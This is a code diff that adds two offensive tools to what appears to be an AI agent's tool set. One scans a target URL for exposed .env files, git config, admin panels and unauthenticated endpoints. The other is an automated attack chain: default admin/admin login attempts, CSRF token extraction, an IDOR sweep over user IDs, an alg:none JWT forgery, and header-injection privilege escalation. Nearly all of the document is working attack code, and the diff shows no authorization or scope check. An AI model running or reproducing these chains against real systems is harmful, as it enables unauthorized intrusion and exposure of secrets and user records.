@@ -620,6 +620,30 @@ TOOLS = {
             },
             "required": ["hosts"]
         }
+    },
+    "info_disclosure": {
+        "description": "Phase 2 information disclosure scanner. Checks exposed .env, .git, composer.json, package.json, requirements.txt, source maps, admin panels, and stack-specific unauthenticated endpoints (n8n, Portainer, Supabase). Low noise, critical findings before any active scanning.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target": {"type": "string", "description": "Target base URL (e.g. https://target.com)"},
+                "deep":   {"type": "boolean", "description": "Run extended checks including framework-specific paths (default: true)"}
+            },
+            "required": ["target"]
+        }
+    },
+    "session_chain": {
+        "description": "Multi-step authenticated attack chain: login attempt → CSRF extraction → IDOR sweep → JWT decode/attack → privilege escalation. Chains session-based vulnerabilities automatically.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target":   {"type": "string", "description": "Target base URL"},
+                "username": {"type": "string", "description": "Username to test (default: admin)"},
+                "password": {"type": "string", "description": "Password to test (default: admin)"},
+                "id_range": {"type": "string", "description": "ID range for IDOR sweep (default: 1-50)"}
+            },
+            "required": ["target"]
+        }
     }
 }
 
@@ -1367,6 +1391,172 @@ PYEOF"""
         out   = args.get("out", "/tmp/aquatone_out")
         flags = args.get("flags", "")
         return f"echo {shlex.quote(args['hosts'])} | aquatone -out {shlex.quote(out)} {flags} 2>&1 | head -60"
+
+    elif tool == "info_disclosure":
+        target = args['target'].rstrip('/')
+        deep   = args.get('deep', True)
+        t      = shlex.quote(target)
+        paths_core = [
+            ("/.env",                          "DOTENV"),
+            ("/.env.local",                    "DOTENV_LOCAL"),
+            ("/.env.backup",                   "DOTENV_BACKUP"),
+            ("/.git/config",                   "GIT_CONFIG"),
+            ("/.git/HEAD",                     "GIT_HEAD"),
+            ("/vendor/composer/installed.json","COMPOSER_DEPS"),
+            ("/package.json",                  "NPM_DEPS"),
+            ("/package-lock.json",             "NPM_LOCK"),
+            ("/requirements.txt",              "PY_DEPS"),
+            ("/pyproject.toml",                "PY_PROJECT"),
+            ("/Pipfile",                       "PIPFILE"),
+            ("/adminer.php",                   "ADMINER"),
+            ("/phpmyadmin/",                   "PHPMYADMIN"),
+        ]
+        paths_deep = [
+            ("/rest/settings",                 "N8N_SETTINGS"),
+            ("/api/status",                    "PORTAINER_STATUS"),
+            ("/api/users/admin/init",          "PORTAINER_INIT"),
+            ("/rest/v1/",                      "SUPABASE_SCHEMA"),
+            ("/app/config/parameters.yml",     "SYMFONY_CONFIG"),
+            ("/var/logs/prod.log",             "SYMFONY_LOGS"),
+            ("/phpinfo.php",                   "PHPINFO"),
+            ("/_debug",                        "DEBUG_PANEL"),
+            ("/actuator",                      "SPRING_ACTUATOR"),
+            ("/graphql",                       "GRAPHQL"),
+            ("/api-docs",                      "SWAGGER"),
+            ("/openapi.json",                  "OPENAPI"),
+            ("/swagger-ui.html",               "SWAGGER_UI"),
+        ]
+        all_paths = paths_core + (paths_deep if deep else [])
+        lines = ['echo "=== INFO DISCLOSURE SCAN: ' + target + ' ==="']
+        for path, label in all_paths:
+            url = shlex.quote(target + path)
+            lines.append(
+                f'CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{{http_code}}" -m 8 {url}); '
+                f'BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\\n"); '
+                f'[ "$CODE" != "404" ] && [ "$CODE" != "000" ] && '
+                f'echo "[{label}] HTTP $CODE  {path}  BODY:$BODY" || '
+                f'echo "[ - ] $CODE  {path}"'
+            )
+        # Source map check - find bundle and test for .map
+        lines.append(
+            f'echo "=== SOURCE MAP CHECK ==="; '
+            f'BUNDLE=$(curl -sk -m 10 {t} | grep -oE "assets/index-[^\\\"]+\\.js" | head -1); '
+            f'[ -n "$BUNDLE" ] && {{ '
+            f'CODE=$(curl -sk -o /dev/null -w "%{{http_code}}" -m 8 {t.strip(chr(39))}/"$BUNDLE".map); '
+            f'echo "[SOURCE_MAP] HTTP $CODE  /$BUNDLE.map"; }}; '
+        )
+        return " && ".join(lines) + " 2>&1"
+
+    elif tool == "session_chain":
+        target   = args['target'].rstrip('/')
+        user     = shlex.quote(args.get('username', 'admin'))
+        pwd      = shlex.quote(args.get('password', 'admin'))
+        id_range = args.get('id_range', '1-50')
+        id_start, id_end = (id_range.split('-') + ['50'])[:2]
+        t = shlex.quote(target)
+        return f"""python3 - <<'CHAINEOF'
+import subprocess, re, json, base64, urllib.request, urllib.parse
+
+TARGET  = {shlex.quote(target)}
+USER    = {user}
+PASSWD  = {pwd}
+ID_START= {id_start}
+ID_END  = {id_end}
+
+def curl(method, url, data=None, headers=None, cookies=None):
+    cmd = ['curl','-sk','-m','15','-X',method,'-w','\\n__STATUS__%{{http_code}}',
+           '-D','/tmp/sc_headers.txt']
+    if data:  cmd += ['-d', data]
+    for h in (headers or []): cmd += ['-H', h]
+    for c in (cookies or []): cmd += ['-b', c]
+    cmd += [url]
+    r = subprocess.run(cmd, capture_output=True, text=True)
+    body,_,status = r.stdout.rpartition('\\n__STATUS__')
+    hdrs = open('/tmp/sc_headers.txt').read() if __import__('os').path.exists('/tmp/sc_headers.txt') else ''
+    return body.strip(), status.strip(), hdrs
+
+print("=== SESSION CHAIN ATTACK ===")
+print(f"Target: {{TARGET}}  User: {{USER}}")
+
+# Step 1: Login attempt with common endpoints
+print("\\n[STEP 1] Login attempt...")
+for ep in ['/login','/admin/login','/api/login','/api/auth','/auth/login','/signin','/user/login']:
+    body, code, hdrs = curl('POST', TARGET+ep,
+        data=f'username={{USER}}&password={{PASSWD}}',
+        headers=['Content-Type: application/x-www-form-urlencoded'])
+    if code in ('200','302') and any(k in body.lower()+hdrs.lower() for k in ['token','session','cookie','dashboard','redirect','welcome']):
+        print(f"  [LOGIN_OK] {{ep}} HTTP {{code}}")
+        SESSION_COOKIES = re.findall(r'Set-Cookie: ([^;\\r\\n]+)', hdrs, re.I)
+        TOKEN = re.search(r'"token"\\s*:\\s*"([^"]+)"', body)
+        if TOKEN: print(f"  [TOKEN] {{TOKEN.group(1)[:80]}}")
+        if SESSION_COOKIES: print(f"  [COOKIES] {{SESSION_COOKIES[:3]}}")
+        break
+    elif code not in ('404','000'):
+        print(f"  HTTP {{code}} {{ep}}")
+else:
+    print("  No login endpoint responded 200/302. Trying JSON...")
+    for ep in ['/api/login','/api/auth','/api/v1/login','/api/v1/auth']:
+        body, code, hdrs = curl('POST', TARGET+ep,
+            data=json.dumps({{'username':USER,'password':PASSWD}}),
+            headers=['Content-Type: application/json'])
+        if code in ('200','201'):
+            print(f"  [LOGIN_JSON_OK] {{ep}} HTTP {{code}}: {{body[:200]}}")
+            break
+
+# Step 2: CSRF token extraction
+print("\\n[STEP 2] CSRF token extraction...")
+home_body, _, _ = curl('GET', TARGET)
+csrf = re.search(r'(?:csrf[_-]?token|_token|__RequestVerificationToken)["\s]+value=["\']([^"\']{10,})', home_body, re.I)
+if csrf:
+    print(f"  [CSRF_FOUND] {{csrf.group(1)[:60]}}")
+else:
+    csrf_meta = re.search(r'<meta[^>]+name=["\']csrf[^"\']*["\'][^>]+content=["\']([^"\']+)', home_body, re.I)
+    if csrf_meta: print(f"  [CSRF_META] {{csrf_meta.group(1)[:60]}}")
+    else: print("  No CSRF token found in homepage")
+
+# Step 3: IDOR sweep
+print(f"\\n[STEP 3] IDOR sweep /api/user/ID ({{ID_START}}-{{ID_END}})...")
+hits = []
+for i in range(int(ID_START), min(int(ID_END)+1, int(ID_START)+50)):
+    for ep in ['/api/user/','/api/users/','/api/profile/','/rest/v1/users?id=eq.']:
+        body, code, _ = curl('GET', TARGET+ep+str(i))
+        if code == '200' and len(body) > 20:
+            hits.append((ep+str(i), code, body[:100]))
+            break
+if hits:
+    print(f"  [IDOR_FOUND] {{len(hits)}} records accessible:")
+    for ep, code, preview in hits[:5]:
+        print(f"    {{ep}} HTTP {{code}} → {{preview}}")
+else:
+    print("  No IDOR found in range")
+
+# Step 4: JWT decode attempt
+print("\\n[STEP 4] JWT detection and decode...")
+auth_body, auth_code, auth_hdrs = curl('GET', TARGET+'/api/me', headers=['Authorization: Bearer test'])
+jwt_pat = re.findall(r'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*', home_body+auth_body)
+if jwt_pat:
+    tok = jwt_pat[0]
+    try:
+        parts = tok.split('.')
+        h = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
+        p = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
+        print(f"  [JWT_FOUND] alg={{h.get('alg')}} sub={{p.get('sub')}} role={{p.get('role')}}")
+        if h.get('alg','').lower() != 'none':
+            none_h = base64.urlsafe_b64encode(json.dumps({{'alg':'none','typ':'JWT'}}).encode()).rstrip(b'=').decode()
+            print(f"  [JWT_ALG_NONE_ATTEMPT] {{none_h}}.{{parts[1]}}.")
+    except: print(f"  [JWT_FOUND] could not decode: {{tok[:60]}}")
+
+# Step 5: Privilege escalation via header injection
+print("\\n[STEP 5] Trust header escalation...")
+for hdr in ['X-User-Role: admin','X-Admin: true','X-Internal-User: admin','X-Authenticated: true','X-User-ID: 1']:
+    body, code, _ = curl('GET', TARGET+'/api/admin', headers=[hdr])
+    if code in ('200','201') and len(body) > 10:
+        print(f"  [PRIVESC_OK] Header {{hdr}} → HTTP {{code}} body={{body[:100]}}")
+    else:
+        print(f"  HTTP {{code}} with {{hdr}}")
+
+print("\\n=== SESSION CHAIN COMPLETE ===")
+CHAINEOF"""
 
     return None
 
